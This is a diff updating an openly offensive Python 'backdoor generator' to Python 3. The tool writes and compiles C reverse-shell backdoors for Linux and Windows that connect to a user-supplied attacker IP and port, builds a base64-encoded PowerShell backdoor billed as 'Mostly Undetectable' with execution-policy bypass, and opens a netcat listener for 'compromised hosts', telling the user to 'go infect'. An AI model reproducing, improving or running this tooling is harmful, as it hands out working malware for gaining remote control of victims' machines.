@@ -3,14 +3,13 @@
 
 import os 
 import sys
-import io
 import socket
 
-
-
+if sys.version_info > (3, 0):
+    raw_input = input
 
 def main():
-    print """
+    print ("""
 _____________________________________________________________ 
 |                                                   ^^^^^^^^\ |
 |                                                   |       | |
@@ -40,7 +39,7 @@ responsible for any damage you cause :) if you get in trouble I don't care
 2. Listener
 
 
-"""
+""")
 
     global option
     option = raw_input('Choose from the following options #~: ')
@@ -57,7 +56,7 @@ responsible for any damage you cause :) if you get in trouble I don't care
 
 def backdoor_generator():
     
-    print """
+    print ("""
 
                 ,----------------,                ,---------, 
             ,--------------------------,        ,"        ," |
@@ -88,12 +87,12 @@ def backdoor_generator():
 
 
 
-"""
+""")
 
-    select = input( "Select from the following options ")
+    select = raw_input( "Select from the following options ")
 
-    if(select == 1):
-        print """
+    if(select == '1'):
+        print ("""
 
 
 ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗    ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
@@ -105,16 +104,16 @@ def backdoor_generator():
 
 
                             ~ Linux Reverse Shell Gen ~
-"""
+""")
 
         host = raw_input("[?] Enter your IP (LHOST): " )
         port = raw_input("[?] Enter your port (LPORT): ")
         linux_shell(host, port)
         os.system("gcc .shell.c -o backdoor -pthread && rm -rf .shell.c")
-        print "[*] Backdoor Generated now go infect lol ...[*]"
+        print ("[*] Backdoor Generated now go infect lol ...[*]")
 
-    if(select == 2):
-        print """
+    if(select == '2'):
+        print ("""
 
 
 
@@ -127,16 +126,16 @@ def backdoor_generator():
                                                                                                
                             ~ Windows Reverse Shell Gen ~
                                 
-"""        
+""")       
 
         host = raw_input( "[?] Enter your IP (LHOST): " )
         port = raw_input("[?] Enter your port (LPORT):" )
         windows_reverse(host, port)
         os.system("/usr/bin/i686-w64-mingw32-gcc winshell.c -o backdoor.exe -lws2_32 && rm -rf winshell.c")
-        print "[*] Backdoor Generated now go infect lol ...[*]"
+        print ("[*] Backdoor Generated now go infect lol ...[*]")
  
-    if(select == 3):
-        print """
+    if(select == '3'):
+        print ("""
 
 ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██████╗  ██████╗  ██████╗ ██████╗ 
 ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
@@ -148,7 +147,7 @@ def backdoor_generator():
                     ~ Base64 Encoded Powershell Backdoor gen ~
                               (Mostly Undetectable)
 
-"""
+""")
 
         powershell_payload()
 
@@ -158,8 +157,8 @@ def backdoor_generator():
 
 
 def linux_shell(host, port):
-    print "[*] Starting Process.. [*]"
-    with io.FileIO(".shell.c", "w") as file:
+    print ("[*] Starting Process.. [*]")
+    with open(".shell.c", "w") as file:
         file.write('''
 
 #include <stdio.h>
@@ -173,8 +172,8 @@ int main (int argc, char **argv)
   struct sockaddr_in client;
  
   client.sin_family = AF_INET;
-  client.sin_addr.s_addr = inet_addr("'''+host+'''");
-  client.sin_port = htons('''+port+''');
+  client.sin_addr.s_addr = inet_addr("%s");
+  client.sin_port = htons(%s);
 
   scktd = socket(AF_INET,SOCK_STREAM,0);
   connect(scktd,(struct sockaddr *)&client,sizeof(client));
@@ -187,8 +186,7 @@ int main (int argc, char **argv)
 
   return 0;
 }
-
-''')
+''' % (host, port))
 
 
 
@@ -196,7 +194,7 @@ int main (int argc, char **argv)
 #Credits to BlackBox Hacker ( Xabber Lord ) he wrote this a whole back years ago ..... people copied it without giving credits
 #Permission taken and thanked too :) 
 def windows_reverse(host, port):
-    with io.FileIO("winshell.c", "w") as file:
+    with open("winshell.c", "w") as file:
         file.write('''
 #include <winsock2.h>
 #include <stdio.h>
@@ -235,7 +233,7 @@ int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdPara
                          
 def powershell_payload(): # Powershell payload creation
 
-    payload = """
+    payload = ("""
 
 #!/bin/bash
 
@@ -255,13 +253,13 @@ command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 echo $command
 
 
-        """
+        """)
 
     os.system(payload)
 
 
 def banner():
-    print """
+    print ("""
 
  _______________          |*\_/*|________ 
 |  ___________  |        ||_/-\_|______  | 
@@ -278,7 +276,7 @@ def banner():
 ~ A Simple Listener To Accept Connections From Compromised Hosts ~
 
 
-"""
+""")
 
 def listener():
 
@@ -287,13 +285,9 @@ def listener():
     os.system("nc -l %s" %port)
 
   except:
-    print "[*] Listener could not be initiated [*]"
+    print ("[*] Listener could not be initiated [*]")
 
 
   
 if __name__ == '__main__':
     main()
-
-   
-
-    
